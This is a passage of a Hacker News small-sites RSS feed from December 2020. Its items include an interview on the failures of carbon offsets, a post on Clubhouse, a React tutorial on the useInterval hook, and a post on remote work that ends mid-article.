to mix and match dependency management on a per-Lambda basis.</p><p id="11fd">We think this is a massive step forward in the ergonomics of building cloud function-native applications â€” weâ€™d love to hear what you think in <a href="https://architecture-as-text.slack.com/archives/C6BGT0D08/p1600199636147600" rel="noopener">Architectâ€™s Slack</a>!</p><p id="6444">Â¹ Architect will ship ESM support when Lambda ships Node.js 14 support; dynamic requires are not supported</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/552/0*gLbMxDzidLVqVwjW.png" width="276" height="400" data-old-src="https://miro.medium.com/max/42/0*gLbMxDzidLVqVwjW.png?q=20"></p></div></div><figcaption>Art by <a href="https://www.michaelramstead.com/" rel="noopener">Michael Ramstead</a></figcaption></figure></div></div></section></div></div>]]>
            </description>
            <link>https://blog.begin.com/architect-8-4-say-hello-to-lambda-treeshaking-898bf5008c70</link>
            <guid isPermaLink="false">hacker-news-small-sites-25500305</guid>
            <pubDate>Mon, 21 Dec 2020 22:18:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fuck Amazon Vine]]>
            </title>
            <description>
<![CDATA[
Score 40 | Comments 36 (<a href="https://news.ycombinator.com/item?id=25500255">thread link</a>) | @fivedogit
<br/>
December 21, 2020 | https://thingamagig.com/vine/WhyAmazonVineSucks.html?x=3 | <a href="https://web.archive.org/web/*/https://thingamagig.com/vine/WhyAmazonVineSucks.html?x=3">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://thingamagig.com/vine/WhyAmazonVineSucks.html?x=3</link>
            <guid isPermaLink="false">hacker-news-small-sites-25500255</guid>
            <pubDate>Mon, 21 Dec 2020 22:13:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Carbon offsets aren't working, and probably can't]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25499746">thread link</a>) | @wcerfgba
<br/>
December 21, 2020 | https://www.volts.wtf/p/carbon-offsets-arent-working-and | <a href="https://web.archive.org/web/*/https://www.volts.wtf/p/carbon-offsets-arent-working-and">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>All right, Voltaires, today we have the second part of my conversation with Danny Cullenward and David Victor, authors of the new book <em><a href="https://politybooks.com/bookdetail/?isbn=9781509541799">Making Climate Policy Work</a></em>. (See <a href="https://www.volts.wtf/p/why-carbon-pricing-will-never-be">part one</a> for their credentials and background.)</p><p>The book, you will recall, is an extended argument that carbon pricing schemes, despite their attractiveness in economic theory, run afoul of fundamental forces in political economy.</p><p>In <a href="https://www.volts.wtf/p/why-carbon-pricing-will-never-be">part one</a> we talked about why people love carbon pricing so much and why, despite promises of expansion, most carbon pricing system still only cover a narrow band of economic sectors. </p><p>Today we tackle two more of the bookâ€™s big topics. </p><p>The first is carbon offsets. A carbon offset is basically a payment to a third party to take some carbon-reducing action â€” plant trees, prevent deforestation, capture and bury carbon, what have you. The idea is that entities for whom reducing direct emissions is expensive or impossible can still pay for reductions. </p><p>In the context of carbon pricing systems, offsets are designed to play two roles. First, they are supposed to hold prices down, since they are often cheaper than direct reductions. And second, they are supposed to allow carbon pricing systems to reduce emissions even in sectors that are not covered by the system and are otherwise difficult to reach. </p><p>Like carbon pricing itself, carbon offsets are an appealing idea. Pay less, for more emission reductions, and help save forests while you do it! More and more cities, states, and companies are making net-zero pledges without really knowing how to get there, so lots of them are looking around for cheap reductions, and carbon offsets are sitting right there.</p><p>But the model only works in practice if the carbon reductions represented by carbon offsets are real â€” verifiable and verified. Cullenward and Victor argue that they rarely are, and furthermore, that the incentives created by the programs themselves work against reliable verification. Large-scale offsets programs inevitably spark a race to the bottom.</p><p>Second, we talk about linkages. Just as carbon pricing programs were supposed to expand to cover more economic sectors, they were supposed to expand to bring in more jurisdictions, more states and countries. That hasnâ€™t happened either, and the explanation turns out to be more or less the same.</p><p>Letâ€™s jump in!</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F4c4410c8-248f-43fe-80bf-04301a359d0c_1100x55.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F4c4410c8-248f-43fe-80bf-04301a359d0c_1100x55.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/4c4410c8-248f-43fe-80bf-04301a359d0c_1100x55.png&quot;,&quot;height&quot;:55,&quot;width&quot;:1100,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:2227,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><h3>Carbon offsets havenâ€™t worked, donâ€™t work, and wonâ€™t work</h3><h4>David Roberts</h4><p>Letâ€™s talk about carbon offsets, a perpetually hot topic. Offsets do a lot of work in carbon pricing systems, easing the political difficulties that the pricing systems themselves create. That would be fine if they were reliable and verifiable. But you guys say they're not, and whatâ€™s more, never will be. Explain. </p><h4>Danny Cullenward</h4><p>There's two parts. First is the difficulty in saying what a good offset is. The second is the politics â€” what offsets are for and how the money gets used. </p><p>The fundamental problem with offsets is that we can't observe what doesn't happen. The offset project is making a claim: if you didn't pay us, we wouldn't do this thing. It's a counterfactual claim that's factually unobservable. You can only infer, by evidence, reasoning, and detailed sector-specific knowledge, what might or might not happen. That's a challenging problem in the best of circumstances. </p><p>Everyone imagines there's this vast army of people working on this problem, ensuring that there's a good outcome, but in practice, you see understaffed regulators â€” very few people paying close attention to this who have no financial interests. And you see special-interest nonprofit organizations figuring out if they line up behind these offset programs, they can direct the revenues to particular causes. </p><p>An offset is basically a way of channeling a compliance obligation on a polluter to some third-party activity. So if you can direct the flow of those funds, that's powerful. Just a quick data point: in California, there's over 200 million offset credits, easily worth 10 bucks apiece. That's $2 billion in private financial flows that have moved through a regulatory program that has fewer than a dozen full-time staff members. </p><p>That problem is massive â€” you lose that fight every time, because of the fundamental political economy of offsets. Almost everywhere they've been used in compliance programs, theyâ€™ve been used for cost containment. </p><p>The story is, I can deliver a climate pollution reduction somewhere else at lower cost. If the quality of that offset credit is identical to a reduction inside the program, you have no change in emissions, you just have lower costs.</p><h4>David Roberts</h4><p>Again, a very appealing theory.</p><h4>Danny Cullenward  </h4><p>It's very elegant. </p><p>It's important to point out some of the environmental justice [EJ] concerns. If you don't reduce your pollution here, the people who experience the local air pollution associated with, say, a refinery have sincere and legitimate concerns. But assuming we solved the local air-quality problem and the EJ problem, it's an appealing theory, for sure. </p><p>The political problem is that these programs want offsets to keep costs down. To be honest, they don't particularly care about quality. At the end of the day, their bottom line is about increasing the volume at the lowest possible cost. </p><p>So the fundamental political economy is structured around massive volumes of low-priced offsets â€” the most problematic ones. It becomes a race to the bottom, where people compete on price and not quality. </p><p>And nobody really cares about quality in these public markets. That's why in every single major compliance offsets program, you see this downward spiral in quality. They are not about achieving comparable environmental aims. They are about reducing compliance costs. </p><p data-attrs="{&quot;url&quot;:&quot;https://www.volts.wtf/p/carbon-offsets-arent-working-and?&amp;utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;class&quot;:null}"><a href="https://www.volts.wtf/p/carbon-offsets-arent-working-and?&amp;utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share"><span>Share</span></a></p><h4>David Roberts</h4><p>Is there not a single offset program you could point to that has fought off these trends and maintained high quality?</p><h4>Danny Cullenward</h4><p>I'll be honest, I spend a lot of time working on this and it's hard for me to point to a lot that's working well. </p><p>The counter-examples are, you're starting to see some companies in the private sector say that they don't care what the price is, theyâ€™re only concerned with quality. Those private sector buyers are going to help create markets for quality offsets. </p><p>There are some small-scale things you can point to, but when you look to large volumes of offset credits at low prices, I don't think there's a single program that's delivered that successfully.</p><h4>David Victor</h4><p>I agree. The place to watch is voluntary markets amongst folks who understand the quality problem, understand the logic of why offsets, if they can be done with integrity, are important. </p><p>One of the reasons offsets persist, keep coming back like bell-bottoms, is that you now see a bunch of companies and governments under enormous pressure to make net-zero pledges. </p><p>Itâ€™s coming from the right place. But when they go do the numbers, they have a heart attack. They don't know what to do, especially if you go all the way up to scope-three emissions. [Scope-three emissions â€” indirect emissions embedded in a companyâ€™s or jurisdictionâ€™s supply chains â€” are explained <a href="https://www.carbontrust.com/resources/briefing-what-are-scope-3-emissions">here</a>.]</p><p>So they all say the right things in public: we want to make all the reductions ourselves to the extent possible, yada yada. Meanwhile, the analysts say, you've made this public pledge, how are you going to do this? The only backstop answer is offsets. </p><p>So they almost have to imagine that these problems of quality don't exist, or can be solved â€” â€œ<a href="https://www.climatechangenews.com/2020/11/10/mark-carney-oversees-blueprint-scaling-carbon-market-offset-demand-soars/">Mark Carney is working on it</a>, so it'll be fine.â€ Once that magic wand is waved and offsets are available, net zero is possible. The sad irony here is that a lot of companies and governments are trying to do the right thing, but net-zero pledges are propagating the belief that offsets are working fine.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F438ea9bb-ba85-4280-a2e0-7c77cfb3cadb_5000x3328.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F438ea9bb-ba85-4280-a2e0-7c77cfb3cadb_5000x3328.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/438ea9bb-ba85-4280-a2e0-7c77cfb3cadb_5000x3328.jpeg&quot;,&quot;height&quot;:969,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:2927396,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a><figcaption>Alaskan forests, shrouded and opaque, much like carbon offsets. (Photo: Getty Images)</figcaption></figure></div><h4>David Roberts</h4><p>Thereâ€™s an argument to be made that if these companies and governments didnâ€™t have access to offsets, and just had to reduce their direct and indirect emissions on their own, it would appear so daunting and terrifying that you'd get less support. Perhaps having a release valve in offsets is enabling these corporations and jurisdictions to feel confident enough to step up at all. Do you worry about cutting that off?</p><h4>Danny Cullenward</h4><p>That's the political trap of starting with a flawed paradigm. </p><p>I'm trying to make a slightly different case to them for what to do. Take a company that has made a bold pledge and set aside a budget for this. I don't want them to reduce the funds theyâ€™re putting into climate, I want them to grow that over time, and I think a lot of companies get that and want to do that. But is that money going to good things?</p><p>When you're competing on price and nobody's looking over quality, difficult things that are real can't compete. So we need to break the current relationship between price and effort in these systems. People need to stop pretending that we can cheaply offset our way to net-zero goals. </p><p>To a company that has been blindly purchasing generic offsets and is becoming aware of these problems â€” don't stop. Take the money and make the most of it. That means not fetishizing tonnage claims and the implementation of net zero. </p><p>That's a difficult thing to do, because people have made all these bold pledges. But we have to figure out a way to search for quality. We don't see that working in offsets. </p><h4>David Roberts</h4><p>What about the fact that there are big emitting sectors that are problematic and don't fit well under a carbon pricing system? Are there ways to get at them other than offsets?</p><h4>Danny Cullenward</h4><p>When people say offsets can help us get to sectors we can't otherwise get to, you need to remember two things. </p><p>First, what does it take to do a good offsets program? It means you know a great deal about what's going on in that sector, what's possible, what's not possible, who's doing it â€” you need all of this detailed information. To set your additionality standards and baselines and all the technical â€¦</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.volts.wtf/p/carbon-offsets-arent-working-and">https://www.volts.wtf/p/carbon-offsets-arent-working-and</a></em></p>]]>
            </description>
            <link>https://www.volts.wtf/p/carbon-offsets-arent-working-and</link>
            <guid isPermaLink="false">hacker-news-small-sites-25499746</guid>
            <pubDate>Mon, 21 Dec 2020 21:24:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Thoughts on Clubhouse]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25499615">thread link</a>) | @ggoo
<br/>
December 21, 2020 | https://julian.digital/2020/12/21/thoughts-on-clubhouse/ | <a href="https://web.archive.org/web/*/https://julian.digital/2020/12/21/thoughts-on-clubhouse/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
 		
<p>Today marks the 77th day since I got onboarded to <a href="https://www.joinclubhouse.com/">Clubhouse</a>.</p>



<p><a href="https://techcrunch.com/2020/04/18/clubhouse-app-chat-rooms/">Clubhouse, for those not familiar with it, is essentially an audio-first social network.</a> Itâ€™s kind of a mix between Reddit and a podcast. An interactive radio show. The app lets you jump into different chat rooms and participate in â€“ or just listen to â€“ live audio conversations around different topics.</p>



<p>Itâ€™s an exciting product. <br>And yet, in these last 77 days, I have actively used Clubhouse exactly three times.</p>



<p>The problem with Clubhouse is that you can only listen to conversations live as they happen. Given that the majority of the current user base is in North America, the most interesting conversations usually happen in the middle of the (European) night when Iâ€™m asleep.</p>



<p>The first thing I see on my phone after I wake up are a handful of Clubhouse notifications telling me about the all the interesting conversations I missed. I wish I could just download these conversations as podcasts and listen to them later.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/12/clubhouse.png"></p><p>Some have pointed out that the live nature of Clubhouse is exactly what makes it so special, comparing it to the ephemerality of Snapchat. And while I disagree on the Snapchat comparison <span>(ephemerality â‰  synchronous creation and consumption)</span>, I do think it makes sense for Clubhouse to find its own native format rather than compete with podcasts directly.</p>



<p>While Clubhouse feels like live podcasts at the moment, I think over time it will probably evolve into something else. Something more unique.</p>



<p>The current state of Clubhouse reminds me of the early days of Twitter: People knew it was a unique new form factor, but they didnâ€™t know how to use it yet. Most tweets were just short status updates. It took some time until the platform found its current form and use cases.</p>



<p>One of those use cases is â€œTwitter as a second screenâ€: Live commenting TV shows and sports events. I strongly suspect that this will become one of Clubhouseâ€™s main uses cases as well.</p>



<p>As I pointed out in <a href="http://julian.digital/2020/04/19/airpods-as-a-platform/">Airpods as a Platform</a>, I see audio primarily as a secondary interface: You listen to music while youâ€™re working out, for example. You consume podcasts while you are driving or commuting. You talk on Discord while youâ€™re playing a game.</p>



<p>Audio is a medium that supports and augments other activities.</p>



<p>So instead of thinking about whether Clubhouse should make conversations available as downloads, a perhaps more interesting question is what activities could best be augmented with live audio? What does Clubhouse as an audio layer for other content look like?</p>



<p>The most obvious use case seems to be sports (and other events that have to be consumed live). I would love to replace the audio track of my TV sports broadcasters with a select group of (Clubhouse) experts whose opinions Iâ€™m <em>actually</em> interested in.</p>



<p>I wonder what other events or activities this would work for. <br><a href="https://twitter.com/lehrjulian/status/1341044261526130691">Do you have any ideas?</a></p>
 	</div></div>]]>
            </description>
            <link>https://julian.digital/2020/12/21/thoughts-on-clubhouse/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25499615</guid>
            <pubDate>Mon, 21 Dec 2020 21:12:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Declarative Simplicity in React with useInterval]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25499328">thread link</a>) | @hydroxideOH-
<br/>
December 21, 2020 | https://micahcantor.xyz/blog/practical-react-use-interval | <a href="https://web.archive.org/web/*/https://micahcantor.xyz/blog/practical-react-use-interval">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
<p>In Dan Abramov's blog post <a href="https://overreacted.io/making-setinterval-declarative-with-react-hooks/">"Making setInterval Declarative with React Hooks"</a>, he writes about a custom React hook to wrap the native Javascript function, setInterval. The first time I read the article, I thought it was interesting, but I was not convinced by the power of custom hooks until I got the chance to use it in action. That opportunity came when I was designing a music progress bar component. The switch from using <code>setInterval</code> to <code>useInterval</code> resulted in a dramatic reduction in code size and a cleaner design.</p>
<p>The design of <code>useInterval</code> is fairly simple. It looks similar to <code>useEffect</code>, where the first parameter is a callback function. It differs though in the second parameter, which is a number in milliseconds:</p>
<div data-language="jsx"><pre><code><span>let</span> <span>[</span>count<span>,</span> setCount<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>0</span><span>)</span><span>;</span>
<span>useInterval</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>    
  
  <span>setCount</span><span>(</span>count <span>+</span> <span>1</span><span>)</span><span>;</span>  
<span>}</span><span>,</span> <span>1000</span><span>)</span><span>;</span></code></pre></div>
<p>Importantly, the second parameter can also be a ternary conditional expression as well, which is key to the design I explain in this article. If it is a conditional, like <code>shouldCount <span>?</span> <span>1000</span> <span>:</span> <span>null</span></code> then it will only run the callback function if <code>shouldCount</code> is true. </p>
<p>I won't go into the gory details about how <code>useInterval</code> works behind the scenes here. For that, read Abramov's blog; it will do a much better job than I can.</p>
<h2>The original progress bar design</h2>
<p>With some omissions for brevity, here is what the original progress bar looked like:</p>
<div data-language="jsx"><pre><code><span>export</span> <span>const</span> <span>ProgressBar</span> <span>=</span> <span>(</span><span><span>{</span> elapsed<span>,</span> songs<span>,</span> runtime<span>,</span> isPaused<span>,</span> deviceID<span>,</span> room<span>,</span> dispatch <span>}</span></span><span>)</span> <span>=&gt;</span> <span>{</span>

  <span>const</span> <span>[</span>runtimeMS<span>,</span> setRuntimeMS<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>null</span><span>)</span><span>;</span>
  <span>const</span> <span>[</span>progressActive<span>,</span> setProgressActive<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>false</span><span>)</span><span>;</span>
  <span>const</span> <span>[</span>progressIntervalID<span>,</span> setProgressIntervalID<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>null</span><span>)</span><span>;</span>

  <span>{</span> <span>...</span> <span>}</span>

  
  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    
    <span>if</span> <span>(</span>elapsed <span>&gt;=</span> runtimeMS <span>&amp;&amp;</span> progressIntervalID<span>)</span> <span>{</span>
      <span>clearInterval</span><span>(</span>progressIntervalID<span>)</span><span>;</span>
      <span>setProgressActive</span><span>(</span><span>false</span><span>)</span><span>;</span>
      <span>onProgressComplete</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
    
    <span>else</span> <span>if</span> <span>(</span><span>!</span>isPaused <span>&amp;&amp;</span> <span>!</span>progressActive<span>)</span> <span>{</span>
      <span>const</span> intervalID <span>=</span> <span>setInterval</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span>
        <span>dispatch</span><span>(</span><span>{</span> type<span>:</span> <span>'increment-elapsed'</span><span>,</span> increment<span>:</span> <span>50</span> <span>}</span><span>)</span><span>,</span>
        <span>50</span> 
      <span>)</span><span>;</span>
      <span>setProgressActive</span><span>(</span><span>true</span><span>)</span><span>;</span>
      <span>setProgressIntervalID</span><span>(</span>intervalID<span>)</span><span>;</span>
    <span>}</span>
    
    <span>else</span> <span>if</span> <span>(</span>isPaused <span>&amp;&amp;</span> progressActive<span>)</span> <span>{</span>
      <span>setProgressActive</span><span>(</span><span>false</span><span>)</span><span>;</span>
      <span>clearInterval</span><span>(</span>progressIntervalID<span>)</span><span>;</span>
    <span>}</span>
  <span>}</span><span>,</span> <span>[</span>elapsed<span>,</span> isPaused<span>,</span> progressActive<span>,</span> runtimeMS<span>,</span> progressIntervalID<span>,</span> onProgressComplete<span>,</span> dispatch<span>]</span><span>)</span>

  
  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>dispatch</span><span>(</span><span>{</span> type<span>:</span> <span>'set-elapsed'</span><span>,</span> elapsed<span>:</span> <span>0</span> <span>}</span><span>)</span><span>;</span>
    <span>setRuntimeMS</span><span>(</span><span>parseFloat</span><span>(</span>runtime<span>)</span><span>)</span><span>;</span>
    <span>setProgressActive</span><span>(</span><span>false</span><span>)</span><span>;</span>
  <span>}</span><span>,</span> <span>[</span>songs<span>[</span><span>0</span><span>]</span><span>,</span> runtime<span>,</span> dispatch<span>]</span><span>)</span>

  
  <span>useEffect</span><span>(</span><span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>return</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
      <span>clearInterval</span><span>(</span>progressIntervalID<span>)</span><span>;</span>
    <span>}</span>
  <span>}</span><span>,</span> <span>[</span>progressIntervalID<span>]</span></span><span>)</span>

  <span>{</span> <span>...</span> <span>}</span>

  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span><span>SliderInput</span></span> <span>className</span><span><span>=</span><span>"</span>w-full pb-6 mb-1 md:mb-0<span>"</span></span> <span>min</span><span><span>=</span><span>{</span><span>0</span><span>}</span></span> <span>max</span><span><span>=</span><span>{</span>runtimeMS<span>}</span></span> <span>value</span><span><span>=</span><span>{</span>elapsed<span>}</span></span> <span>onChange</span><span><span>=</span><span>{</span>onChange<span>}</span></span><span>&gt;</span></span><span>
  );</span></code></pre></div>
<p>As you can see, even with some of the other logic removed, this component was a bit of a beheamoth. Most of the ugliness stems from the three separate <code>useEffect</code> calls that were responsible for updating the progress bar. </p>
<p>The first function intended to carefully manage the state of the timers when the pause state changed or the song ended. This probably would have been cleaner if it were split up into multiple reducers managing the state of the progress bar and the pause/play button, but that's not the design I had at the time. Instead, the function would trigger when <code>isPaused</code> changed. Then, if the song were playing (<code>!isPaused</code>) and the timer was not already active, it would create a new interval timer that updated every 50 ms. If the song was paused and the timer was already active, it would stop the clock. It would do the same when the song ended (<code>elapsed &gt;= runtimeMS</code>).</p>
<p>Alongside this, the second function would reset the progress bar when a song had been skipped, and the third function would clear all timers when React dismounted the component. Adding to the overhead is the need for local state variables for tracking the id of the setInterval function, and for tracking whether the timer was active.</p>
<p>Yikes. I won't pretend this was good design. It's confusing, difficult to read, and very fragile for such an important component in a music player. There may have been ways to improve the design while retaining setInterval, but after coming across <code>useInterval</code>, I decided to rewrite it using the custom hook in order to simplify the component.</p>
<h2>Switching to useInterval</h2>
<p>First of all, I installed <a href="https://github.com/donavon/use-interval">an implementation of useInterval</a> with <code>npm i @use-it/interval</code>. Here's the new version:</p>
<div data-language="jsx"><pre><code><span>export</span> <span>const</span> <span>ProgressBar</span> <span>=</span> <span>(</span><span><span>{</span> elapsed<span>,</span> songs<span>,</span> runtime<span>,</span> isPaused<span>,</span> deviceID<span>,</span> room<span>,</span> dispatch <span>}</span></span><span>)</span> <span>=&gt;</span> <span>{</span>
  
  <span>const</span> <span>[</span>shouldIncrement<span>,</span> setShouldIncrement<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>false</span><span>)</span><span>;</span>
  
  
  <span>useInterval</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>dispatch</span><span>(</span><span>{</span> type<span>:</span> <span>'increment-elapsed'</span><span>,</span> increment<span>:</span> <span>50</span> <span>}</span><span>)</span><span>;</span>
  <span>}</span><span>,</span> shouldIncrement <span>?</span> <span>50</span> <span>:</span> <span>null</span><span>)</span>

  
  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>setShouldIncrement</span><span>(</span><span>!</span>isPaused <span>&amp;&amp;</span> songs<span>.</span>length <span>&gt;</span> <span>0</span><span>)</span>
  <span>}</span><span>,</span> <span>[</span>isPaused<span>,</span> songs<span>]</span><span>)</span>

  
  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>if</span> <span>(</span>elapsed <span>&gt;=</span> runtime<span>)</span> <span>{</span> 
      <span>if</span> <span>(</span>songs<span>.</span>length <span>===</span> <span>0</span><span>)</span> <span>{</span> 
        <span>setShouldIncrement</span><span>(</span><span>false</span><span>)</span><span>;</span>
      <span>}</span>
      <span>dispatch</span><span>(</span><span>{</span> type<span>:</span> <span>'next-song'</span> <span>}</span><span>)</span><span>;</span>
    <span>}</span>
  <span>}</span><span>,</span> <span>[</span>elapsed<span>,</span> runtime<span>,</span> room<span>,</span> songs<span>,</span> dispatch<span>]</span><span>)</span>

  <span>{</span> <span>...</span> <span>}</span>

  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span><span>SliderInput</span></span> <span>className</span><span><span>=</span><span>"</span>w-full pb-6 mb-1 md:mb-0<span>"</span></span> <span>min</span><span><span>=</span><span>{</span><span>0</span><span>}</span></span> <span>max</span><span><span>=</span><span>{</span>runtimeMS<span>}</span></span> <span>value</span><span><span>=</span><span>{</span>elapsed<span>}</span></span> <span>onChange</span><span><span>=</span><span>{</span>onChange<span>}</span></span><span>&gt;</span></span><span>
  );</span></code></pre></div>
<p>You should be able to see at a glance that this has a much cleaner design. Instead of the confusing and long first <code>useEffect</code> in the original design, most of that behavior is now handled by a conditional usage of <code>useInterval</code>. Again, I'll emphasize here the importance of the second parameter to <code>useInterval</code>: <code> shouldIncrement <span>?</span> <span>50</span> <span>:</span> <span>null</span></code>. This simple ternary sets the callback function to trigger every 50 ms if <code>shouldIncrement</code> is true. In that callback function, all we have to do is increment the state of the progress bar. This kind of conditional is a powerful and expressive change to the design of setInterval which makes this hook such a joy to use.</p>
<p>How do we know what <code>shouldIncrement</code> should be? that's what the other two <code>useEffect</code> calls are for. The first updates shouldIncrement if a song is playing and there is a song in queue. The second one simply turns off the interval when the song reaches the end.</p>
<p>This new design is simpler, easier to read, and less buggy since manually managing the timer has been abstracted away with <code>useInterval</code>. That means there is no need for additional state variables to hold the id of the timer and whether it is active in this new design.</p>
<p>Now, it's certainly not perfect, since it still relies on <code>useEffect</code> to update state when other state changes. That is usually not a best practice, but fixing that problem involved a better global state management design that I did not understand how to implement at the time I wrote this component. I'm also still a student of React, so forgive me for any other design errors.</p>
<p>Still, switching to <code>useInterval</code> resulted in a marked improvement, and if your React code requires carefully managing timers, I would recommend considering a switch to it.</p></div></div></div>]]>
            </description>
            <link>https://micahcantor.xyz/blog/practical-react-use-interval</link>
            <guid isPermaLink="false">hacker-news-small-sites-25499328</guid>
            <pubDate>Mon, 21 Dec 2020 20:43:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Work Remotely]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25499327">thread link</a>) | @bbu
<br/>
December 21, 2020 | https://bueti-online.ch/blog/remote-work/ | <a href="https://web.archive.org/web/*/https://bueti-online.ch/blog/remote-work/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>After a nice and calm summer the second wave caught up with us here in Switzerland and we are back to working from home full time.</p><p>When the federal government mandated that people work from home whenever possible, many companies were thrown into a situation they werenâ€™t prepared to handle. Nevertheless, all over the world people proved how adaptable humans are. Given the circumstances, I think this big experiment was mostly a success.</p><p>Luckily, even before the Coronavirus Pandemic and prior to my <a href="https://www.granviaje.ch/">sabbatical</a>, I had experience with remote work as I worked with distributed teams and I managed a team of engineers in three different timezones.</p><p>I canâ€™t stress enough that you cannot just transplant your office processes into the remote world and think things will work the same. They might for a while, but long-term your team will burn-out.</p><p>Working from home (or working with a distributed team) requires a different philosophy.</p><h2 id="accommodate-the-people-who-do-not-have-a-home-office">Accommodate the people who do not have a â€œhome officeâ€</h2><p>We need to acknowledge and keep in mind that not everybody has the environment at home to work full time.</p><p>For people in smaller apartments with families and kids, for example, it can be difficult to get something done. This is especially true when schools are closed. Give your employees the time to breathe they need, support them by providing the necessary equipment to work from home, and let them chose the hours that work best for them. If they are not able to put in 8 hours of work, thatâ€™s ok too. A lockdown is temporary. Family goes first. <a href="https://m.signalvnoise.com/the-company-isnt-a-family/">No, we are not family at work</a>.</p><h2 id="asynchronous-communication">Asynchronous Communication</h2><p>Working with a fully remote team provides some unique chances to improve on what most people donâ€™t like about offices: Constant interruptions, noise, and long meetings</p><p><strong>If</strong> you have a dedicated home office, the quietness and calmness of working from home can be a godsend. However, we need to be mindful of the attention hogs like Slack and other real-time communication tools.
One of the most frequent complaints I hear is that people canâ€™t focus on a task because of constant interruptions.</p><p>As a team lead, set the guidelines and embrace asynchronous communication.</p><p>It takes a while to get used to, but writing down a question properly often results in new insights and you might not even need somebody elseâ€™s input after formulating the question.</p><h2 id="keeping-the-spirit">Keeping the Spirit</h2><p>Many people say that â€œcompany cultureâ€ gets lost when everybody is remote. Thatâ€™s not true. If your culture gets lost when people cannot go to the office, there wasnâ€™t much of a culture to begin with. What is true, however, is that your companyâ€™s culture might change.</p><p>When everybody is in their own home itâ€™s harder to keep a personal connection. Schedule some additional time in your rituals at the beginning so people can just chat. We also have a â€œvirtual water fountainâ€ channel where people can share non-work related stuff and hang out at coffee breaks.
We also have an ongoing â€œopen windowâ€-meet where people can hang out during work to see each other. This is completely optional and not everybody likes to do that. But I like to have a place that I can join when I take a coffee break or before ending the day just to hang out.
